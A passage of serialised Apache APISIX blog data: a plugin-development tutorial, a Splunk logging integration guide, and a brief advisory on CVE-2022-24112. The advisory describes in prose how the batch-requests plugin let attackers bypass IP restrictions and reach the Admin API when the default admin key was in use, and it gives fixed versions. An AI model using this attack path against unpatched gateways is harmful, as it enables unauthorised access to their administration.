you set later will overwrite what you set earlier. Is there a better solution to this problem?\\n\\n### Issue #6265\\n\\n**Link**: https://github.com/apache/apisix/issues/6265\\n\\n**Issue description**:\\n\\nThe test case in [t/core/utils.t](https://github.com/apache/apisix/blob/ec0fc2ceaf04a20b0bd0ebdaad67296a1d3f621c/t/core/utils.t) currently has some code errors, such as:\\n\\n```Lua\\n         content_by_lua_block {\\n             local core = require(\\"apisix.core\\")\\n             local resolvers = {\\"8.8.8.8\\"}\\n             core.utils.set_resolver(resolvers)\\n             local ip_info, err = core.utils.dns_parse(\\"github.com\\")\\n             if not ip_info then\\n                 core.log.error(\\"failed to parse domain: \\", host, \\", error: \\",err)\\n             end\\n             ngx.say(require(\\"toolkit.json\\").encode(ip_info))\\n         }\\n```\\n\\nThe variable `host` is a `nil` when the code is executed here (which may never happened).\\n\\n## Highlights of Recent Features\\n\\n- [Supports to logging apisix_latency and upstream_latency](https://github.com/apache/apisix/pull/6063)\uff08Contributor: [jagerzhang](https://github.com/jagerzhang)\uff09\\n\\n- [Add CSRF plugin](https://github.com/apache/apisix/pull/5727)\uff08Contributor: [Baoyuantop](https://github.com/Baoyuantop)\uff09\\n\\n- [Add file-logger plugin](https://github.com/apache/apisix/pull/5831)\uff08Contributor: [guoqqqi](https://github.com/guoqqqi)\uff09\\n\\n- [Add public-api plugin](https://github.com/apache/apisix/pull/6145)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [Add opentelemetry plugin](https://github.com/apache/apisix/pull/6119)\uff08Contributor: [yangxikun](https://github.com/yangxikun)\uff09\\n\\n- [Add loggly plugin](https://github.com/apache/apisix/pull/6113)\uff08Contributor: [bisakhmondal](https://github.com/bisakhmondal)\uff09\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [Integrating Splunk HTTP Event Collector with Apache APISIX](https://apisix.apache.org/blog/2022/02/10/apisix-splunk-integration)\uff1a\\n\\n  This article explains how to configure and use the Splunk HEC service in Apache APISIX.\\n\\n- [Forward-auth, Another Choice for Authentication Function](https://apisix.apache.org/blog/2022/01/26/apisix-integrate-forward-auth-plugin)\uff1a\\n\\n  This article describes the use of `forward-auth`, a new plugin in Apache APISIX, and provides detailed instructions on how to use this cleanly designed authentication model.\\n\\n- [Integrating Apache APISIX with gRPC-Web](https://apisix.apache.org/blog/2022/01/25/apisix-grpc-web-integration)\uff1a\\n\\n  Apache APISIX already supports gRPC protocol proxies, as well as HTTP(s) to gRPC Server proxies via the gRPC Transcode plugin. Through active community discussion and contributions, Apache APISIX has broadened the scope of support for the gRPC ecosystem: support for the gRPC Web Protocol Request Proxy.\\n  \\n- [HashiCorp Vault Secure Storage Backend in Apache APISIX Ecosystem](https://apisix.apache.org/blog/2022/01/21/apisix-hashicorp-vault-integration)\uff1a\\n\\n  This article brings you the upcoming release of the Vault-Apache APISIX integration and related details.\\n\\n- [xRPC Will Be Released, Get More Details About APISIX Ecosystem](https://apisix.apache.org/blog/2022/01/21/apisix-xrpc-details-and-miltilingual)\uff1a\\n\\n  This article brings you Apache APISIX\'s upcoming xRPC framework and related details, as well as a detailed presentation of Apache APISIX in multi-language development support.\\n\\n- [The Practice of Public Gateway in CDN Scenario from UPYUN](https://apisix.apache.org/blog/2022/01/20/upyun-public-gateway-usecase)\uff1a\\n\\n  In the previous sharing, we brought you the application of cloud at the Ingress level. This time, we will introduce you to the current cloud application examples under the public network gateway scenario, hoping to bring you some practical Apache APISIX scenarios to share in the cloud storage industry."},{"id":"How to develop plugin in API Gateway","metadata":{"permalink":"/blog/2022/02/16/file-logger-api-gateway","source":"@site/blog/2022/02/16/file-logger-api-gateway.md","title":"How to develop plugin in API Gateway","description":"This article introduces the specific steps for front-end engineers to develop file-logger plugins on the cloud-native API gateway Apache APISIX.","date":"2022-02-16T00:00:00.000Z","formattedDate":"February 16, 2022","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":9.155,"truncated":true,"authors":[{"name":"Qi Guo","title":"Author","url":"https://github.com/guoqqqi","image_url":"https://avatars.githubusercontent.com/u/72343596?v=4","imageURL":"https://avatars.githubusercontent.com/u/72343596?v=4"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://avatars.githubusercontent.com/u/36651058?v=4","imageURL":"https://avatars.githubusercontent.com/u/36651058?v=4"}],"prevItem":{"title":"Biweekly Report (Feb 1 - Feb 14)","permalink":"/blog/2022/02/17/weekly-report-0214"},"nextItem":{"title":"Apache APISIX Vulnerability for Rewriting X-REAL-IP Header (CVE-2022-24112)","permalink":"/blog/2022/02/11/cve-2022-24112"}},"content":"> This article documents the process of developing the `file-logger` plugin by a front-end engineer with no back-end experience.\\n\\n\x3c!--truncate--\x3e\\n\\nOver the past few months, community users have added many plugins to Apache APISIX, enriching the Apache APISIX ecosystem. From the user\'s point of view, the emergence of more diverse plugins is certainly a good thing, as they fulfill more of the user\'s expectations for a gateway that is \\"one-stop\\" and \\"multi-functional\\" processor on top of perfecting the high performance and low latency of Apache APISIX.\\n\\nNone of the articles on the Apache APISIX blog seem to go into detail about the process of developing plugins. So let\'s take a look at the process from the perspective of a plugin developer and see how a plugin is born!\\n\\nThis article documents the process of developing the `file-logger` plugin on API Gateway by **a front-end engineer with no back-end experience**. Before digging into the details of the implementation process, we will briefly introduce the functionality of `file-logger`.\\n\\n## Introduction of file-logger plugin\\n\\n`file-logger` supports generating custom log formats using Apache APISIX plugin metadata. Users can append request and response data in JSON format to log files via the `file-logger` plugin, or push the log data stream to a specified location.\\n\\nImagine this: when monitoring the access log of a route, we not only care about the value of certain request and response data, but also want to write the log data to a specified file. This is where the `file-logger` plugin can be used to help achieve these goals.\\n\\n![how it works](https://static.apiseven.com/202108/1644996258131-a0e32942-dcc5-4129-873f-0a7551532e77.png)\\n\\nWe can use `file-logger` to write log data to a specific log file to simplify the process of monitoring and debugging.\\n\\n## How to implement a plugin?\\n\\nAfter introducing the features of file-logger, you will have a better understanding of this plugin. The following is a detailed explanation of how I, a front-end developer with no server-side experience, develop the plugin for Apache APISIX and add the corresponding tests for it.\\n\\n### Confirm the name and priority of the plugin\\n\\nOpen the [Apache APISIX Plugin Development Guide](https://apisix.apache.org/docs/apisix/plugin-develop/#name-priority-and-the-others) and in order of priority you need to determine the following two things:\\n\\n1. Determine the plugin category.\\n2. prioritize the plugins and update the `conf/config-default.yaml` file.\\n\\nSince this development of `file-logger` is a logging type plugin, I refer to the name and ordering of the existing logging plugins for Apache APISIX and place `file-logger` here.\\n\\n![file-logger\'s position](https://static.apiseven.com/202108/1644996436166-58305d35-3798-4df2-b8df-1874f3e0cb01.png)\\n\\nAfter consulting with other plugin authors and enthusiastic members of the community, the name `file-logger` and priority `399` of the plugin were finally confirmed.\\n\\n> Note that the priority of the plugin is related to the order of execution; the higher the value of the priority, the more forward the execution. And the ordering of plugin names is not related to the order of execution.\\n\\n### Create a minimum executable plugin file\\n\\nAfter confirming the plugin name and priority, you can create our plugin code file in `apisix/plugins/` directory . There are two points to note here:\\n\\n- If the plugin code file is created directly in the `apisix/plugins/` directory, there is no need to change the `Makefile` file.\\n- If your plugin has its own code directory, you need to update the `Makefile` file, please refer to the [Apache APISIX Plugin Development Guide](https://apisix.apache.org/docs/apisix/plugin-develop/#name-priority-and-the-others) for detailed steps.\\n\\n1. Here we create the `file-logger.lua` file in the `apisix/plugins/ directory`.\\n2. Then we will complete an initialized version based on the `example-plugin`.\\n\\n```lua\\n-- Introduce the module we need in the header\\nlocal log_util     =   require(\\"apisix.utils.log-util\\")\\nlocal core         =   require(\\"apisix.core\\")\\nlocal plugin       =   require(\\"apisix.plugin\\")\\nlocal ngx          =   ngx\\n\\n-- Declare the plugin\'s name\\nlocal plugin_name = \\"file-logger\\"\\n\\n-- Define the plugin schema format\\nlocal schema = {\\n    type = \\"object\\",\\n    properties = {\\n        path = {\\n            type = \\"string\\"\\n        },\\n    },\\n    required = {\\"path\\"}\\n}\\n\\n-- Plugin metadata schema\\nlocal metadata_schema = {\\n    type = \\"object\\",\\n    properties = {\\n        log_format = log_util.metadata_schema_log_format\\n    }\\n}\\n\\n\\nlocal _M = {\\n    version = 0.1,\\n    priority = 399,\\n    name = plugin_name,\\n    schema = schema,\\n    metadata_schema = metadata_schema\\n}\\n\\n-- Check if the plugin configuration is correct\\nfunction _M.check_schema(conf, schema_type)\\n    if schema_type == core.schema.TYPE_METADATA then\\n        return core.schema.check(metadata_schema, conf)\\n    end\\n    return core.schema.check(schema, conf)\\nend\\n\\n-- Log phase\\nfunction _M.log(conf, ctx)\\n    core.log.warn(\\"conf: \\", core.json.encode(conf))\\n    core.log.warn(\\"ctx: \\", core.json.encode(ctx, true))\\nend\\n\\n\\nreturn _M\\n```\\n\\nOnce the minimal available plugin file is ready, the plugin\'s configuration data and request-related data can be output to the `error.log` file via `core.log.warn(core.json.encode(conf))` and `core.log.warn(\\"ctx: \\", core.json.encode(ctx, true))`.\\n\\n### Enable and test the plugin\\n\\nThe following are a couple of steps for testing. In order to test whether the plugin can successfully print the plugin data and request-related data information we configured for it to the error log file, we need to enable the plugin and create a test route.\\n\\n1. Prepare a test upstream locally (the test upstream used in this article is `127.0.0.1:3030/api/hello`, which I created locally).\\n2. Create a route via `curl` command and enable our new plugin.\\n\\n   ```shell\\n    curl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n    {\\n    \\"plugins\\": {\\n        \\"file-logger\\": {\\n        \\"path\\": \\"logs/file.log\\"\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n        \\"127.0.0.1:3030\\": 1\\n        }\\n    },\\n    \\"uri\\": \\"/api/hello\\"\\n    }\'\\n   ```\\n\\n   You will then see a status code `200`, indicating that the route was successfully created.\\n3. Run the `curl` command to send a request to the route to test whether the `file-logger` plugin has been started.\\n\\n   ```shell\\n   curl -i http://127.0.0.1:9080/api/hello\\n   HTTP/1.1 200 OK\\n   ...\\n   hello, world\\n   ```\\n\\n4. In the `logs/error.log` file there will be a record:\\n\\n   ![record in logs/error.log](https://static.apiseven.com/202108/1644996952020-7a79d5df-e679-42f1-94f3-40a913db790c.png)\\n\\n   As you can see, the `path: logs/file.log` that we configured for the plugin in the conf parameter has been successfully saved. At this point we have successfully created a minimally usable plugin that prints the `conf` and `ctx` parameters in the logging phase.\\n\\n   After that, we can write the core functionality for the `file-logger.lua` plugin directly in its code file. Here we can directly run the `apisix reload` command to reload the latest plugin code without restarting Apache APISIX.\\n\\n### Write core function for the file-logger plugin\\n\\nThe main function of the file-logger plugin is to write log data. After asking other people from the community and checking the information, I learned about Lua\'s IO library, and confirmed that the logic of the plugin\'s function is roughly the following steps.\\n\\n1. After each accepted request, output the log data to the `path` configured by the plugin.\\n   1. First, get the value of `path` in `file-logger` through `conf` in the logging phase.\\n   2. Then, the Lua IO library is used to create, open, write, refresh the cache, and close the file.\\n2. Handle errors such as open file failure, create file failure, etc.\\n\\n   ```lua\\n    local function write_file_data(conf, log_message)\\n        local msg, err = core.json.encode(log_message)\\n        if err then\\n            return core.log.error(\\"message json serialization failed, error info : \\", err)\\n        end\\n\\n        local file, err = io_open(conf.path, \'a+\')\\n\\n        if not file then\\n            core.log.error(\\"failed to open file: \\", conf.path, \\", error info: \\", err)\\n        else\\n            local ok, err = file:write(msg, \'\\\\n\')\\n            if not ok then\\n                core.log.error(\\"failed to write file: \\", conf.path, \\", error info: \\", err)\\n            else\\n                file:flush()\\n            end\\n            file:close()\\n        end\\n    end\\n   ```\\n\\n3. Referring to the source code of `http-logger` plugin, I finished the method of passing the log data to the write log data and some judgment and processing of the metadata.\\n\\n   ```lua\\n    function _M.log(conf, ctx)\\n        local metadata = plugin.plugin_metadata(plugin_name)\\n        local entry\\n\\n        if metadata and metadata.value.log_format\\n            and core.table.nkeys(metadata.value.log_format) > 0\\n        then\\n            entry = log_util.get_custom_format_log(ctx, metadata.value.log_format)\\n        else\\n            entry = log_util.get_full_log(ngx, conf)\\n        end\\n\\n        write_file_data(conf, entry)\\n    end\\n   ```\\n\\n## Validate and add tests\\n\\n### Validate the log records\\n\\nSince the `file-logger` plugin was enabled when the test route was created and the path was configured as `logs/file.log`, we can simply send a request to the test route to verify the results of the log collection at this point.\\n\\n```shell\\ncurl -i http://127.0.0.1:9080/api/hello\\n```\\n\\nIn the corresponding logs/file.log we can see that each record is saved in JSON format. After formatting one of the data, it looks like this.\\n\\n```json\\n{\\n    \\"server\\":{\\n        \\"hostname\\":\\"....\\",\\n        \\"version\\":\\"2.11.0\\"\\n    },\\n    \\"client_ip\\":\\"127.0.0.1\\",\\n    \\"upstream\\":\\"127.0.0.1:3030\\",\\n    \\"route_id\\":\\"1\\",\\n    \\"start_time\\":1641285122961,\\n    \\"latency\\":13.999938964844,\\n    \\"response\\":{\\n        \\"status\\":200,\\n        \\"size\\":252,\\n        \\"headers\\":{\\n            \\"server\\":\\"APISIX\\\\/2.11.0\\",\\n            \\"content-type\\":\\"application\\\\/json; charset=utf-8\\",\\n            \\"date\\":\\"Tue, 04 Jan 2022 08:32:02 GMT\\",\\n            \\"vary\\":\\"Accept-Encoding\\",\\n            \\"content-length\\":\\"19\\",\\n            \\"connection\\":\\"close\\",\\n            \\"etag\\":\\"\\\\\\"13-5j0ZZR0tI549fSRsYxl8c9vAU78\\\\\\"\\"\\n        }\\n    },\\n    \\"service_id\\":\\"\\",\\n    \\"request\\":{\\n        \\"querystring\\":{\\n\\n        },\\n        \\"size\\":87,\\n        \\"method\\":\\"GET\\",\\n        \\"headers\\":{\\n            \\"host\\":\\"127.0.0.1:9080\\",\\n            \\"accept\\":\\"*\\\\/*\\",\\n            \\"user-agent\\":\\"curl\\\\/7.77.0\\"\\n        },\\n        \\"url\\":\\"http:\\\\/\\\\/127.0.0.1:9080\\\\/api\\\\/hello\\",\\n        \\"uri\\":\\"\\\\/api\\\\/hello\\"\\n    }\\n}\\n```\\n\\nThis concludes the verification of the collection of log records . The verification results indicate that the plugin was successfully launched and returned the appropriate data.\\n\\n### Add more tests for the plugin\\n\\nFor the `add_block_preprocessor` part of the code, I was confused when I first started writing it because I had no previous experience with Perl. After researching, I realized the correct way to use it: if we don\'t write `request` assertions and `no_error_log` assertions in the data section, then the default assertion is as follows.\\n\\n```lua\\n--- request\\nGET /t\\n--- no_error_log\\n[error]\\n```\\n\\nAfter taking some other logging test files into account, I created the file `file-logger.t` in the `t/plugin/` directory.\\n\\nEach test file is divided by `__DATA__` into a preamble section and a data section. Since there is no clear classification of test-related documents on the official website, you can refer to the related materials at the end of the article for more details. Here is one of the test cases that I have completed after referring to the relevant materials.\\n\\n```perl\\nuse t::APISIX \'no_plan\';\\n\\nno_long_string();\\nno_root_location();\\n\\nadd_block_preprocessor(sub {\\n    my ($block) = @_;\\n\\n    if (! $block->request) {\\n        $block->set_value(\\"request\\", \\"GET /t\\");\\n    }\\n\\n    if (! $block->no_error_log && ! $block->error_log) {\\n        $block->set_value(\\"no_error_log\\", \\"[error]\\");\\n    }\\n});\\n\\n\\nrun_tests;\\n\\n__DATA__\\n\\n=== TEST 1: sanity\\n--- config\\n    location /t {\\n        content_by_lua_block {\\n            local configs = {\\n                -- full configuration\\n                {\\n                    path = \\"file.log\\"\\n                },\\n                -- property \\"path\\" is required\\n                {\\n                    path = nil\\n                }\\n            }\\n\\n            local plugin = require(\\"apisix.plugins.file-logger\\")\\n\\n            for i = 1, #configs do\\n                ok, err = plugin.check_schema(configs[i])\\n                if err then\\n                    ngx.say(err)\\n                else\\n                    ngx.say(\\"done\\")\\n                end\\n            end\\n        }\\n    }\\n--- response_body_like\\ndone\\nproperty \\"path\\" is required\\n```\\n\\nThis concludes the plugin addition test session.\\n\\n## Summary\\n\\nThe above is the whole process of implementing an Apache APISIX plugin from 0 as a newbie in the backend. I did encounter a lot of pitfalls in the process of developing the plugin, but luckily there are many enthusiastic brothers in the Apache APISIX community to help me solve the problems, which made the development and testing of the file-logger plugin relatively smooth throughout. If you are interested in this plugin, or want to see the details of the plugin, you can refer to the [official Apache APISIX documentation](https://apisix.apache.org/docs/apisix/next/plugins/file-logger/).\\n\\nApache APISIX is also currently working on other plugins to support more integration services, so if you\'re interested, feel free to start a discussion in the [GitHub Discussion](https://github.com/apache/apisix/discussions), or via the [mailing list](https://apisix.apache.org/docs/general/join).\\n\\n## References\\n\\n- [Apache APISIX Plugin Development Guide](https://apisix.apache.org/docs/apisix/plugin-develop/)\\n- [Lua - File I/O Usage Guide](https://www.tutorialspoint.com/lua/lua_file_io.htm)\\n- [How to run Apache APISIX test cases](https://apisix.apache.org/docs/apisix/how-to-build/#step-4-run-test-cases)\\n- [How to Write Test Cases](https://apisix.apache.org/docs/apisix/plugin-develop/#write-test-case)\\n- [Introduction to the Apache APISIX testing framework](https://apisix.apache.org/docs/apisix/internal/testing-framework/)\\n- [Introduction to some APIs related to test-nginx](https://metacpan.org/pod/Test%3A%3ANginx%3A%3ASocket)"},{"id":"Apache APISIX Vulnerability for Rewriting X-REAL-IP Header (CVE-2022-24112)","metadata":{"permalink":"/blog/2022/02/11/cve-2022-24112","source":"@site/blog/2022/02/11/cve-2022-24112.md","title":"Apache APISIX Vulnerability for Rewriting X-REAL-IP Header (CVE-2022-24112)","description":"In versions prior to Apache APISIX 2.12.1, there is a risk of rewriting X-REAL-IP header after enabling the Apache APISIX `batch- requests` plugin.","date":"2022-02-11T00:00:00.000Z","formattedDate":"February 11, 2022","tags":[{"label":"Vulnerabilities","permalink":"/blog/tags/vulnerabilities"}],"readingTime":1.23,"truncated":true,"authors":[],"prevItem":{"title":"How to develop plugin in API Gateway","permalink":"/blog/2022/02/16/file-logger-api-gateway"},"nextItem":{"title":"Integrating Splunk HTTP Event Collector with API Gateway","permalink":"/blog/2022/02/10/splunk-apisix-integration"}},"content":"> In versions prior to Apache APISIX 2.12.1, there is a risk of rewriting X-REAL-IP header after enabling the Apache APISIX `batch-requests` plug-in. Now the processing information will be announced.\\n\\n\x3c!--truncate--\x3e\\n\\n## Problem Description\\n\\nIn versions of Apache APISIX prior to 2.12.1 (excluding 2.12.1 and 2.10.4), there is a risk of rewriting the X-REAL-IP header when the Apache APISIX batch-requests plugin is enabled.\\n\\nThis risk leads to two problems:\\n\\n- An attacker bypasses the IP restrictions on the Apache APISIX data plane via the batch-requests plugin. For example, bypassing IP black and white list restrictions.\\n- If the user uses the default Apache APISIX configuration (Admin API enabled, with the default Admin Key and no additional admin port assigned), an attacker can invoke the Admin API via the batch-requests plug-in.\\n\\n## Affected Versions\\n\\n- All versions of Apache APISIX between 1.3 ~ 2.12.1 (excluding 2.12.1)\\n- All LTS versions of Apache APISIX between 2.10.0 ~ 2.10.4 (excluding 2.10.4)\\n\\n## Solution\\n\\n- This issue has been resolved in versions 2.12.1 and 2.10.4, please update to the relevant version as soon as possible.\\n- In affected versions of Apache APISIX, you can avoid this risk by explicitly commenting out batch-requests in the conf/config.yaml and conf/config-default.yaml files and restarting Apache APISIX.\\n\\n## Vulnerability details\\n\\nSeverity\uff1aHigh\\n\\nVulnerability public date: February 11, 2022\\n\\nCVE details: https://nvd.nist.gov/vuln/detail/CVE-2022-24112\\n\\n## Contributor Profile\\n\\nThis vulnerability was reported to the Apache Software Foundation by Sauercloud. Thank you for your contributions to the Apache APISIX community.\\n\\n![Sauercloud](https://static.apiseven.com/202108/1644632196291-6b9bca14-7893-47c7-9f93-99c28ff54044.png)"},{"id":"Integrating Splunk HTTP Event Collector with API Gateway","metadata":{"permalink":"/blog/2022/02/10/splunk-apisix-integration","source":"@site/blog/2022/02/10/splunk-apisix-integration.md","title":"Integrating Splunk HTTP Event Collector with API Gateway","description":"This article describes how to interface with the Splunk HEC service through the splunk-hec-logging plugin in the cloud-native API gateway Apache APISIX.","date":"2022-02-10T00:00:00.000Z","formattedDate":"February 10, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"},{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":5.03,"truncated":true,"authors":[{"name":"Jinchao Shuai","title":"Author","url":"https://github.com/shuaijinchao","image_url":"https://avatars.githubusercontent.com/u/8529452?v=4","imageURL":"https://avatars.githubusercontent.com/u/8529452?v=4"},{"name":"Yilin Zeng","title":"Technical Writer","url":"https://github.com/yzeng25","image_url":"https://avatars.githubusercontent.com/u/36651058?v=4","imageURL":"https://avatars.githubusercontent.com/u/36651058?v=4"}],"prevItem":{"title":"Apache APISIX Vulnerability for Rewriting X-REAL-IP Header (CVE-2022-24112)","permalink":"/blog/2022/02/11/cve-2022-24112"},"nextItem":{"title":"forward-auth Plugin for Authentication Function","permalink":"/blog/2022/01/26/apisix-integrate-forward-auth-plugin"}},"content":"> This article explains how to configure and use the Splunk HEC service in Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\nThe complexity of systems is increasing as technology iterates and enterprise architecture evolves. **Logs can support and be compatible with different analysis engines to reduce the cost for users in the selection, operation and maintenance process.** Log-based analysis and observation plays a very important role as the cornerstone to ensure system stability.\\n\\nApache APISIX is not only an API Gateway with exceptional performance, but also has supported most of the mainstream open source and commercial logging solutions through the communication with community users on data and logging operation and maintenance, including: [HTTP Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/http-logger.md), [TCP Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/tcp-logger.md), [Kafka Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/kafka-logger.md), [UDP Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/udp-logger.md), [RocketMQ Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/rocketmq-logger.md), [SkyWalking Logger](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/skywalking-logger.md), [Aliyun Cloud Logging(SLS)](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/sls-logger.md), [Google Cloud Logging](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/google-cloud-logging.md), etc.\\n\\nWe now have a new addition to the Apache APISIX Logger support matrix: [Splunk HEC Logging](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/google-cloud-logging.md).\\n\\nThis article explains how to configure and use the [Splunk HEC](https://docs.splunk.com/Documentation/Splunk/8.2.3/Data/TroubleshootHTTPEventCollector) service in Apache APISIX.\\n\\n## About Splunk HTTP Event Collector\\n\\n[Splunk](https://www.splunk.com/) is a full-text search engine for machine data that can be used to collect, index, search, and analyze data from a variety of applications. According to DB Engines\' search engine ranking, Splunk is currently in second place and is a widely used full-text search software. Splunk, like ElasticSearch, is a quasi-real-time data stream that provides uninterrupted search results.\\n\\n[Splunk HTTP Event Collector (HEC)](https://docs.splunk.com/Documentation/Splunk/latest/Data/UsetheHTTPEventCollector) is an HTTP event collector provided by Splunk that provides the ability to send data and application events to Splunk using the HTTP(S) protocol.\\n\\n## About splunk-hec-logging plugin\\n\\nWhen the maximum processing capacity of a queue is reached or when the maximum time to refresh the buffer is reached, data in the queue will be committed to Splunk HEC.\\n\\n## How to use the splunk-hec-logging plugin\\n\\n### Splunk Configuration\\n\\n#### Deploy Splunk Enterprise\\n\\nPlease refer to [Splunk\'s installation guide](https://docs.splunk.com/Documentation/Splunk/8.2.3/Installation/Chooseyourplatform) for deployment. This article will demonstrate deployment via Docker.\\n\\nDocker command parameters are as follows.\\n\\n```shell\\ndocker run -p 18088:8088 -p 18000:8000 \\\\    # 8088 is the HEC port, 8000 is the management backend port\\n  -e \\"SPLUNK_PASSWORD=your-password\\" \\\\      # Admin Login Password\\n  -e \\"SPLUNK_START_ARGS=--accept-license\\" \\\\ # Accept the license terms (Splunk will provide an Enterprise Trial License by default)\\n  -e \\"SPLUNK_HEC_TOKEN=your-hec-token\\" \\\\    # Set the default HEC token, this will create a default HEC after configuration\\n  -itd --rm --name splunk-example splunk/splunk:latest\\n```\\n\\nThe command parameters are explained in the [Docker Splunk Documentation](https://splunk.github.io/docker-splunk/).\\n\\n#### Configure Splunk HEC\\n\\nThe default HEC is already configured and created in Docker, so we won\'t go into the process of creating it here. For details on the manual creation process, please refer to the documentation: [Set up and use HTTP Event Collector in Splunk Web](https://docs.splunk.com/Documentation/Splunk/8.2.3/Data/UsetheHTTPEventCollector).\\n\\n#### Login to Splunk Enterprise and check HEC\\n\\nAccess the mapped port of Docker through the browser. Since you need to map the `8000` port of the management backend to the `18000` port of the host, you can access it from the browser by \\"loopback address plus port\\" on the host during operation. For example: http://127.0.0.1:18000, the default username for login is admin, and the password is the `SPLUNK_PASSWORD` value set in the environment variable in the above example.\\n\\nAs shown in the figure below, it means the login is successful.\\n\\n![Splunk UI](https://static.apiseven.com/202108/1644488346684-867cb3a1-a6fd-4dc6-8cb7-f08c1843ac66.png)\\n\\nClick on \\"Settings > Data Inputs\\" at the top right of the screen to check if the default HEC is set successfully.\\n\\n![Default HEC](https://static.apiseven.com/202108/1644488375914-ce04f987-eb8e-4708-93b7-f0685b145fff.png)\\n\\nWe can already see the number of HECs in the Inputs column of the HTTP Event Collector, indicating successful setup.\\n\\n![the number of HECs](https://static.apiseven.com/202108/1644488402376-09c44d02-c6aa-4948-8ca7-2b58a310d010.png)\\n\\nAt this point, you can click HTTP Event Collector to enter the HEC details list to view the Token information of HECs.\\n\\n![HECs Token information](https://static.apiseven.com/202108/1644488428695-db33a594-df06-4857-9421-60bd30cae91e.png)\\n\\nToken Values is the value of `SPLUNK_HEC_TOKEN` configured in the Docker environment variable above.\\n\\n### Apache APISIX Configuration\\n\\n#### Enable the splunk-hec-logging plugin\\n\\nRun the following command to enable the `splunk-hec-logging` plugin.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\":{\\n        \\"splunk-hec-logging\\":{\\n            \\"endpoint\\":{\\n                // HEC endpoint\\n                \\"uri\\":\\"http://127.0.0.1:18088/services/collector\\",\\n                // HEC Token\\n                \\"token\\":\\"BD274822-96AA-4DA6-90EC-18940FB2414C\\"\\n            },\\n            // // Maximum time (in seconds) to refresh the batch queue buffer\\n            \\"inactive_timeout\\":2,\\n             // Maximum number of log entries per batch queue\\n            \\"batch_max_size\\":10\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    },\\n    \\"uri\\":\\"/splunk.do\\"\\n}\'\\n```\\n\\nThe plug-in parameters are described in the following table.\\n\\n|Name|Required|Default Value|Description|\\n|----|----|----|----|\\n|endpoint|Yes|N/A|Splunk HEC Endpoint Configuration Information|\\n|endpoint.uri|Yes|N/A|Splunk HEC Event Collection API|\\n|endpoint.token|Yes|N/A|Splunk HEC Identity Token|\\n|endpoint.channel|No|N/A|Splunk HEC send channel identification, refer to: [About HTTP Event Collector Indexer Acknowledgment](https://docs.splunk.com/Documentation/Splunk/8.2.3/Data/AboutHECIDXAck)|\\n|endpoint.timeout|No|10|Splunk HEC data submission timeout in seconds.|\\n|ssl_verify|No|TRUE|Enable SSL authentication, refer to: [OpenResty Documentation](https://github.com/openresty/lua-nginx-module#tcpsocksslhandshake).|\\n|max_retry_count|No|0|Maximum number of retries before removal from the processing pipeline.|\\n|retry_delay|No|1|Number of seconds that process execution should be delayed if execution fails.|\\n|buffer_duration|No|60|The maximum duration (in seconds) of the oldest entry in the batch must be processed first.|\\n|inactive_timeout|No|5|Maximum time to refresh the buffer in seconds.|\\n|batch_max_size|No|1000|Maximum number of entries per batch queue.|\\n\\n#### Send the request\\n\\nRun the following command to send a request to Splunk.\\n\\n```shell\\n$ curl -i http://127.0.0.1:9080/splink.do\\nHTTP/1.1 200 OK\\nContent-Type: text/html; charset=utf-8\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\nDate: Fri, 10 Dec 2021 09:57:52 GMT\\nServer: APISIX/2.11.0\\n\\nHello, Splunk HEC Logging\\n```\\n\\n#### Verify the log\\n\\nLog in to the Splunk console and click \\"Search & Reporting\\".\\n\\n![Splunk console](https://static.apiseven.com/202108/1644487376250-7c5d32b0-368a-4ee2-9285-38cb0ee571f0.png)\\n\\nType `source=\\"apache-apisix-splunk-hec-logging\\"` in the search box to query the sent request logs.\\n\\n![query the logs](https://static.apiseven.com/202108/1644487401080-b3b18cf9-f576-4e05-be98-2d5fde34fe8e.png)\\n\\n#### Disable the splunk-hec-logging plugin\\n\\nRemove the `splunk-hec-logging` configuration to disable the plugin.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\":\\"/logging.do\\",\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    },\\n    \\"plugins\\":{\\n    }\\n}\'\\n```\\n\\n## Summary\\n\\nApache APISIX is also currently working on additional plugins to support integration with more services, so if you\'re interested, feel free to start a discussion thread in our [GitHub Discussion](https://github.com/apache/apisix/discussions) or communicate via the [mailing list](https://apisix.apache.org/zh/docs/general/join).\\n\\n## Related articles\\n\\n- [Apache APISIX Integration with Kafka for Efficient Real-Time Log Monitoring](https://apisix.apache.org/blog/2022/01/17/apisix-kafka-integration)\\n- [Apache APISIX & RocketMQ Helps User API Log Monitoring 